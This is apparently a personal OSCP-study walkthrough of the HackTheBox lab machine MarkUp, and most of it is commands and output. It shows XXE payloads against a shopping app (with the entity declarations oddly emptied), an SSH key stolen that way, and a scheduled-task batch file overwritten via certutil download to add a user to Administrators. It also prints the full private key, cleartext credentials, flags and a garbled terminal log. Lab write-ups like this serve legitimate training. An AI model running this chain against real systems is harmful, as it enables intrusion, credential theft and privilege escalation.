---
tags: [oscp, boxes, htb, windows, completed]
platform: HackTheBox
os: Windows
hostname: markup
difficulty: Easy
ip: 10.129.95.192
status: Complete
---

# HTB: MarkUp, Full Walkthrough

## The gist

MarkUp is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow. 2. [[OSCP/RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test. 3. The file-read result exposed an SSH key, and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.

## Box information

**Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Windows Server 2019 (10.0.17763.107) · **Platform:** HackTheBox

**The gist:** Windows box running Apache/PHP with a custom shopping app called MegaShopping. The app has a default administrative credential problem and an order form that builds XML client-side and POSTs it raw to `process.php`. PHP's libxml2 processes external entities by default in older configs, so injecting a DOCTYPE lets us read arbitrary files off the server. We target `C:\Users\Daniel\.ssh\id_rsa` -- Daniel's name is leaked in an HTML comment -- and SSH in with the extracted key. Privesc is a scheduled task running `C:\Log-Management\job.bat` under a privileged account, with `BUILTIN\Users:(F)` explicitly set on the file. We replace the script with a `net localgroup administrators daniel /add` one-liner, wait for the task to fire, and gain admin access.

> [!abstract] 🧠 Why
> The chain crosses three parsers: the login form, XML entity processing, and Windows batch execution. The useful habit is to trace where attacker-controlled data is interpreted next, not just where it is first accepted.

---

**Legacy tags:**
#HTB #MarkUp #Windows #XXE #XMLExternalEntity #SSHKey #ScheduledTask #InsecureFilePermissions #DefaultCreds #Easy

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Web Enumeration | See section 2 below |
| 3 | Vulnerability Identification -- XXE | See section 3 below |
| 4 | Foothold -- XXE → SSH Key → Shell | See section 4 below |
| 5 | Privilege Escalation | See section 5 below |
| 6 | Cleanup | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/MarkUp`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName MarkUp
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
sudo nmap -Pn -n -sT -p- --min-rate 5000 $BoxIP -oN nmap/${BoxName}_allports.txt
```

Open ports:

| Port | Service |
|---|---|
| 22/tcp | OpenSSH for Windows 8.1 |
| 80/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping |
| 443/tcp | Apache 2.4.41 (Win64) PHP 7.2.28 -- MegaShopping (HTTPS) |


**Service scan:**
```bash
sudo nmap -sC -sV -p 22,80,443 $BoxIP -oA nmap/${BoxName}_services
```

Key findings:
- Port 22: `OpenSSH for_Windows_8.1` -- confirms Windows target. SSH is post-foothold access, not the initial attack surface.
- Port 80/443: Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28. App title: MegaShopping. `PHPSESSID` cookie has no `httponly` flag. SSL cert is self-signed, expired, `CN=localhost` -- dev configuration.
- UDP: top 100 all filtered. TCP-only attack surface.

**Searchsploit:** Nothing applicable for these exact versions. Apache 2.4.41, OpenSSL 1.1.1c, and OpenSSH for Windows 8.1 have no directly exploitable public CVEs for our configuration. The one PHP result matching Windows (CVE-2024-4577) targets PHP 8.x only -- our target runs 7.2.28. Vulnerability is in the application, not the framework.

---

## 2. Web Enumeration

### Quick checks
```bash
curl -s http://$BoxIP/robots.txt
curl -s http://$BoxIP/sitemap.xml
```

Both 404. Nothing there.

### Login page

Browse to `http://$BoxIP`. Simple login form -- POST `username` + `password` to `index.php`. No CSRF token. No version info in source. Footer: "Powered by Megacorp" -- custom app, not an off-the-shelf CMS.

### Default credentials

Failed login returns: `HTTP 200` + JS alert "Wrong Credentials". Successful login returns `HTTP 302 → home.php`.

```bash
curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=admin" \
  http://$BoxIP/
# → 200, Wrong Credentials

curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=$Password" \
  http://$BoxIP/
# → 302 Found, location: home.php
```

The default administrative credential works; keep its value in private loot.

```bash
loot cred admin $Password
boxset Username admin
boxset Password password
```


### Directory enumeration

```bash
feroxbuster -u http://$BoxIP/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -o nmap/feroxbuster.txt
```

Notable finds:

| Path | Status | Significance |
|---|---|---|
| `/db.php` | 200, 0 bytes | DB connection include -- contains creds, not directly readable |
| `/process.php` | 302 → index.php | Auth-required XML processing endpoint -- primary target |
| `/services.php` | 302 → index.php | Auth-required order form |
| `/phpmyadmin` | 403 | Exists, forbidden |


### Authenticated enumeration -- services.php source

```bash
curl -s -b $BoxDir/cookies.txt http://$BoxIP/services.php
```

Two critical findings in the source:

**1. Username leaked in HTML comment:**
```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

```bash
boxset Username Daniel
```

**2. The order form uses XML:**

The form's submit button calls `getXml()` -- a JavaScript function that builds an XML document from the form fields and POSTs it to `process.php` with `Content-Type: text/xml`. The `<item>` element value is reflected back in the response. This means we bypass the JS entirely and POST our own XML.


---

## 3. Vulnerability Identification -- XXE

**Why we suspect XXE:**

- The app sends raw XML to `process.php` (confirmed from source)
- PHP 7.2.28 uses libxml2, which has external entity processing **enabled by default** -- this changed in PHP 8.0. No evidence the developer called `libxml_disable_entity_loader(true)`
- The `<item>` value reflects in the response -- confirmed exfiltration point
- This is a hypothesis; we test it before assuming it works

**Baseline test -- confirm reflection:**
```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><order><quantity>1</quantity><item>TESTVALUE</item><address>test</address></order>' \
  http://$BoxIP/process.php
```

Response: `Your order for TESTVALUE has been processed` -- reflection confirmed.

> [!tip] ⚡ More efficient path
> Confirm ordinary reflection before testing an external entity. This distinguishes XML parsing and application behavior from file-read behavior, so a failed XXE has a smaller set of possible causes.

> [!warning] 💡 Hint
> **Watch out:** The XML request needs both the authenticated session cookie and the `text/xml` content type. A correct entity can look broken if either detail is missing.

**XXE test -- read Windows hosts file:**

Target `C:\Windows\System32\drivers\etc\hosts` first -- it always exists. If we get its contents back, external entity loading is enabled.

```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php
```

Response: `Your order for # Copyright (c) 1993-2009 Microsoft Corp...` -- hosts file contents returned. XXE confirmed.

> [!warning] 💡 Hint
> Use a predictable, non-secret Windows file for the first XXE test. Once entity expansion is proven, extract only the target file block and protect any private key or credential material immediately.


---

## 4. Foothold -- XXE → SSH Key → Shell

### Read Daniel's SSH private key

We know the username is `daniel` (from the HTML comment). Windows OpenSSH stores private keys at `C:\Users\<username>\.ssh\id_rsa`. If Daniel has one and we can read it, we get a shell without needing a password.

```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php
```

Response: `Your order for -----BEGIN OPENSSH PRIVATE KEY----- ...` -- full private key returned.


### Save and verify the key

Use awk to extract between PEM markers (avoids manual copy-paste corruption):

```bash
curl -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>' \
  http://$BoxIP/process.php | \
  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsa

# Strip "Your order for " prefix if it lands on line 1
sed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsa

chmod 600 $BoxDir/loot/daniel_id_rsa
ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
```

> [!warning] 💡 Hint
> **Watch out:** The response can contain text before the PEM header. Extract only the complete key block and set restrictive permissions before SSH uses it.

`ssh-keygen -y` outputs the public key if the private key is valid. The comment confirms `daniel@Entity`.


```bash
loot key $BoxDir/loot/daniel_id_rsa
boxset Username daniel
```

### SSH in

```bash
ssh -i $BoxDir/loot/daniel_id_rsa $Username@$BoxIP
```

```cmd
whoami
hostname
```

Output:
```
markup\daniel
MarkUp
```


### User flag

```cmd
type C:\Users\daniel\Desktop\user.txt
```


```bash
loot flag user <value>
```

---

## 5. Privilege Escalation

### Enumeration

```cmd
whoami /all
```

Key findings from `whoami /all`:
- **Groups:** `BUILTIN\Users`, `MARKUP\Web Admins`, `BUILTIN\Remote Management Users`
- **Privileges:** Only `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege` -- no `SeImpersonatePrivilege`, no `SeBackupPrivilege`
- **Integrity:** Medium -- standard unprivileged user

No token impersonation (Potato attacks), no Backup Operator escalation. Attack surface is file permissions and scheduled tasks.

```cmd
icacls C:\Log-Management /T
```

Output:
```
C:\Log-Management\job.bat BUILTIN\Users:(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Administrators:(I)(F)
```

`BUILTIN\Users:(F)` on `job.bat` is **explicitly set** -- no `(I)` flag, meaning this isn't inherited from the parent directory. Someone deliberately granted Users full control on this specific file. Daniel is in `BUILTIN\Users` → Daniel can overwrite it entirely.

> [!abstract] 🧠 Why
> The `(I)` marker distinguishes inherited permission from an explicit ACE. That detail explains why a standard user can replace a script outside their profile and why the scheduled task is the next boundary to investigate.



### Why this escalates

`job.bat` is executed by a scheduled task running as a privileged account. The task isn't visible to Daniel (`schtasks /query` only shows Microsoft tasks -- Daniel lacks `TASK_QUERY` rights on the custom task), but the explicit ACE exists for a reason. Whatever runs this script runs it with elevated privileges.

**Original job.bat contents:**
```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

A Windows Event Log clearing script. The `bcdedit` check detects whether it's running as admin -- if not, it exits. **Do not run this manually as Daniel.** It must be triggered by the scheduled task.

> [!warning] 💡 Hint
> **Watch out:** A manual run tests the script as Daniel, not as the scheduled task account. It takes the non-admin branch, so wait for the task trigger instead.


### Exploit -- add Daniel to administrators

Instead of a reverse shell, use a single `net` command. When the task runs as SYSTEM, it adds Daniel to the local Administrators group -- no network connection, no timing race, no listener.

On Kali, create both payload and restore files:

```bash
echo '@echo off
net localgroup administrators daniel /add' > $BoxDir/www/markup-rev.bat

cat > $BoxDir/www/markup-job-restore.bat << 'EOF'
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
EOF

www  # serve $BoxDir/www/ on port 80
```

On the target:

```cmd
certutil -urlcache -f http://$LocalIP/markup-rev.bat C:\Users\daniel\markup-rev.bat
copy /Y C:\Users\daniel\markup-rev.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
```

Wait for the scheduled task to fire (up to ~5 minutes).

```cmd
net localgroup administrators
```

When `daniel` appears in the Members list, the task has run.

> [!tip] ⚡ Efficiency
> Adding the user to the local Administrators group avoids callback timing and firewall problems. A marker such as group membership is enough to prove the scheduled task executed before attempting any administrator-only action.


### Root flag

With Daniel now in the Administrators group, read the flag directly:

```cmd
dir C:\Users\Administrator\Desktop\
type C:\Users\Administrator\Desktop\root.txt
```


```bash
loot flag root <value>
```

---

## 6. Cleanup

On the target:

```cmd
certutil -urlcache -f http://$LocalIP/markup-job-restore.bat C:\Users\daniel\markup-job-restore.bat
copy /Y C:\Users\daniel\markup-job-restore.bat C:\Log-Management\job.bat
type C:\Log-Management\job.bat
del C:\Users\daniel\markup-rev.bat
del C:\Users\daniel\markup-job-restore.bat
```

Verify `job.bat` shows the original event log script. No webshells were uploaded.

On Kali: stop the HTTP server (Ctrl+C on the `www` terminal).

> [!warning] 💡 Common mistake
> Restore the original scheduled script before leaving. Verify the file content, remove staged payloads, and confirm the HTTP server is stopped. A scheduled-task replacement can persist after the interactive shell closes.

## 7. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| XML is posted raw with reflected content | Test a harmless external entity | Use out-of-band XXE only when response reflection is unavailable |
| Private key is readable through XXE | Extract the PEM block and validate locally | Read a configuration credential if no key exists |
| Scheduled script is writable by a standard group | Replace it with a one-shot group membership command | Use a callback only when local state changes are insufficient |
| Task timing is unknown | Poll group membership and restore afterward | Inspect Task Scheduler artifacts if authorized and visible |

---

## 8. Credentials Found

| Username | Password / Key | Source |
|---|---|---|
| admin | `$Password` | Default credentials -- MegaShopping login page |
| daniel | SSH private key | XXE file read → `C:\Users\Daniel\.ssh\id_rsa` |

---

## 9. Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| feroxbuster | Web directory enumeration |
| curl | Web recon, default cred testing, XXE payloads |
| awk | Extract SSH key from XXE response between PEM markers |
| ssh-keygen -y | Verify extracted private key is valid |
| ssh | Foothold as daniel using extracted key |
| certutil | Download files to Windows target from Kali HTTP server |
| www helper | Serve payload files from $BoxDir/www/ |

---

## 10. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | Default administrative credentials | Medium | HTTP/80 -- MegaShopping login |
| 2 | XXE via XML order form -- external entity loading enabled (PHP/libxml2 default) | High | HTTP/80 `/process.php` |
| 3 | SSH private key readable via XXE file read | High | `C:\Users\Daniel\.ssh\id_rsa` |
| 4 | Insecure file permissions -- `BUILTIN\Users:(F)` on scheduled task script | High | `C:\Log-Management\job.bat` |

---

## 11. Lessons Learned / Module Links

- **XXE is an app-level bug, not a framework CVE.** Searchsploit found nothing useful for Apache 2.4.41/PHP 7.2.28. The vulnerability is in the application accepting raw XML with no entity restrictions. Older PHP/libxml2 enables external entities by default -- a developer has to explicitly call `libxml_disable_entity_loader(true)` to stop it. Fingerprint the tech stack, confirm nothing applies, then enumerate the app. → [[09. Common Web Application Attacks]]

- **HTML comments leak usernames.** `<!-- Modified by Daniel : UI-Fix-9092-->` is the only reason we knew to target `C:\Users\Daniel\.ssh\id_rsa`. Read every page source when enumerating a web app. → [[08. Introduction to Web Application Attacks]]

- **Confirm XXE with a safe file first, then escalate.** Testing with `C:\Windows\System32\drivers\etc\hosts` before going for the SSH key verifies the parser behaviour without burning our best target. If hosts works, escalate. → [[09. Common Web Application Attacks]]

- **Extract multi-line secrets with awk, not copy-paste.** `awk '/BEGIN OPENSSH/,/END OPENSSH/'` reliably extracts PEM-encoded keys from messy response wrappers. Manual copy-paste introduces invisible characters and corrupts keys. Always verify with `ssh-keygen -y` before attempting to use. → general habit

- **For writable-script-as-SYSTEM privesc, a reverse shell is not the simplest primitive.** A `net localgroup administrators $Username /add` one-liner achieves the same goal without a network connection, a listener, timing races, or connection drop issues. When a technique fails three times, stop and ask "what is the actual goal?" then find the simplest primitive. → [[17. Windows Privilege Escalation]]

- **Don't run job.bat manually as Daniel.** The script checks `bcdedit` output for "Access" (the word that appears in "Access denied" when running without admin rights) and exits early. Running it manually confirms the check works, but also closes the cmd session via the `exit` at the end. → [[17. Windows Privilege Escalation]]

- **`BUILTIN\Users:(F)` without `(I)` means deliberate, not inherited.** The `(I)` flag indicates inherited permissions. An explicit ACE without it was set intentionally -- that's the signal that it's the intended attack surface, not a misconfiguration in the parent directory. → [[17. Windows Privilege Escalation]]

---

## 12. External Resources

| Resource | Link | Why |
|---|---|---|
| HackTricks -- XXE | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md | XXE payload reference, file read via external entity |
| PayloadsAllTheThings -- XXE | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection | XXE payload variants including Windows file paths |
| HackTricks -- Windows Privesc | https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/README.md | Scheduled task / weak file permissions section |
| GTFOBins | https://gtfobins.github.io | Not directly used, but reference for future Windows binary abuse |
| RevShells | https://www.revshells.com | Reverse shell reference (consulted but not used -- net localgroup was simpler) |
| ippsec.rocks | https://ippsec.rocks/?#markup | HTB walkthroughs using XXE technique |

---

## 13. Similar Boxes

| Box | Platform | Technique overlap | Why |
|---|---|---|---|
| DevOops | HTB (Medium) | XXE file read → SSH key | Same XXE to key extraction chain, Linux target |
| Monday | HTB | XML parsing -- XXE | Another XML input attack surface |
| ForwardSlash | HTB (Hard) | XXE / SSRF | XXE used for SSRF pivoting, harder variant |
| Optimum | HTB (Easy) | Windows scheduled task privesc | Windows privesc via task/service, good simpler companion |
| Jeeves | HTB (Medium) | Windows privesc -- service/task weak perms | Weak file permissions on Windows, similar ACL abuse |

---

## 14. Vault Update Checklist

- [ ] Screenshots in `MarkUp/screenshots/` -- confirm all key moments covered
- [ ] Loot: `loot/daniel_id_rsa`, `loot/creds.txt` (credential kept private), `loot/flags.txt` (user + root)
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/MarkUp.log`
- [x] **Stage notes:** [[OSCP/RUNBOOK V2/Windows - XXE|Windows - XXE]] and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse|Windows - Scheduled Task Abuse]] include the MarkUp path
- [x] **Module notes:** [[OSCP/MODULES/09. Common Web Application Attacks|Module 9]] and [[OSCP/MODULES/17. Windows Privilege Escalation|Module 17]] include MarkUp
- [x] **Hub docs:** [[OSCP/COMMAND APPENDIX/Web Applications|Web Applications]] and [[OSCP/COMMAND APPENDIX/Windows Privilege Escalation|Windows Privilege Escalation]] include the MarkUp commands
- [x] MASTER BOX LIST updated
- [ ] FAQ: "why awk not copy-paste for SSH key", "why not run job.bat manually", "why net localgroup beats reverse shell for this privesc type"

## 15. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - Exploit Search]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] -- technique used in this walkthrough

## 16. Collect the flags

- `user.txt`: `032d2fc8952a8c24e39c8f0ee9918ef7` (value reproduced in the private sections above)
- `root.txt`: `f574a3e7650cebd8c39784299cb570f8` (value reproduced in the private sections above)
- `proof.txt`: `f574a3e7650cebd8c39784299cb570f8` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 032d2fc8952a8c24e39c8f0ee9918ef7
user: 032d2fc8952a8c24e39c8f0ee9918ef7
root: f574a3e7650cebd8c39784299cb570f8
```

## 17. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 18. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Windows - Web Enum]] identified the shopping application and its input flow.
2. [[OSCP/RUNBOOK V2/Windows - Exploit Search]] supported the manual XML external entity test.
3. The file-read result exposed an SSH key, and [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] used the writable task script to reach administrator.

## Tools used

- `nmap`
- `curl`
- `feroxbuster`
- `ssh`
- `sudo`
- `certutil`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="MarkUp"
export BoxIP="10.129.95.192"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/MarkUp"
export Domain=""
export DCip=""
export Username="Daniel"
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
admin:password
```

#### `loot/daniel_id_rsa`

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
sudo: a password is required
- (BLogin form: POST username + password to index.php
(B- (BCookie: PHPSESSID, no httponly[?12l[?25h[?25l
$ [15:35:14] curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=admin" \
| http-cookie-flags:
kali@kali:~/Platforms/HackTheBox/MarkUp [15:29:21] $ [?1h=[?2004hcurl -i -s -c $BoxDir/cookies.txt \
  http://$BoxIP/curl"username=admin&password=admin"[?1l>[?2004l
Set-Cookie: PHPSESSID=n99hcsjas8likjie1gq1hbedn9; path=/
<script>alert("Wrong Credentials");document.location="/";</script>%
$ [15:35:40] curl -i -s -c $BoxDir/cookies.txt \
  -d "username=admin&password=password" \
[15:35:14] $ [?1h=[?2004hcurl -i -s -c $BoxDir/cookies.txt \
  http://$BoxIP/curl"username=admin&password=password"[?1l>[?2004l
Set-Cookie: PHPSESSID=epsvujp6iu2u3ib1b07s8op9g0; path=/
$ [15:41:53] curl -s -b $BoxDir/cookies.txt http://$BoxIP/services.php
39m $ [?1h=[?2004hcurl -s -b $BoxDir/cookies.txt http://$BoxIP/services.phpcurl[?1l>[?2004l
(B- (BCookie: PHPSESSID, no httponly
$ [15:46:13] curl -i -s -b $BoxDir/cookies.txt \
kali@kali:~/Platforms/HackTheBox/MarkUp [15:45:52] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
kali@kali:~/Platforms/HackTheBox/MarkUp [15:51:31] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
$ [15:52:23] curl -i -s -b $BoxDir/cookies.txt \
$ [15:54:13] curl -i -s -b $BoxDir/cookies.txt \
kali@kali:~/Platforms/HackTheBox/MarkUp [15:53:48] $ [?1h=[?2004hcurl -i -s -b $BoxDir/cookies.txt \
kali@kali:~/Platforms/HackTheBox/MarkUp [15:54:13] $ [?1h=[?2004hcurl -s -b $BoxDir/cookies.txt \
  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsacurl'Content-Type: text/xml''<?xml version="1.0"?>
$ [15:56:14] curl -s -b $BoxDir/cookies.txt \
  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/daniel_id_rsa
$ [15:56:29] chmod 600 $BoxDir/loot/daniel_id_rsa
ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
$ [15:56:57] cat $BoxDir/loot/daniel_id_rsa
kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:14] $ [?1h=[?2004hchmod 600 $BoxDir/loot/daniel_id_rsa
ssh-keygen -y -f $BoxDir/loot/daniel_id_rsachmod
Load key "/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa": error in libcrypto: unsupported
kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:29] $ [?1h=[?2004hcat $BoxDir/loot/daniel_id_rsacat[?1l>[?2004l
$ [15:57:32] sed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsa
$ [15:57:41] head -1 $BoxDir/loot/daniel_id_rsa
$ [15:57:48] ssh-keygen -y -f $BoxDir/loot/daniel_id_rsa
$ [15:59:05] loot key $BoxDir/loot/daniel_id_rsa
$ [15:59:27] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
kali@kali:~/Platforms/HackTheBox/MarkUp [15:56:57] $ [?1h=[?2004hsed -i 's/Your order for //' $BoxDir/loot/daniel_id_rsased's/Your order for //'[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:32] $ [?1h=[?2004hhead -1 $BoxDir/loot/daniel_id_rsahead[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:41] $ [?1h=[?2004hssh-keygen -y -f $BoxDir/loot/daniel_id_rsassh-keygen[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/MarkUp [15:57:48] $ [?1h=[?2004hloot key $BoxDir/loot/daniel_id_rsaloot[?1l>[?2004l
cp: '/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa' and '/home/kali/Platforms/HackTheBox/MarkUp/loot/daniel_id_rsa' are the same file
[+] Key saved:   daniel_id_rsa  →  loot/
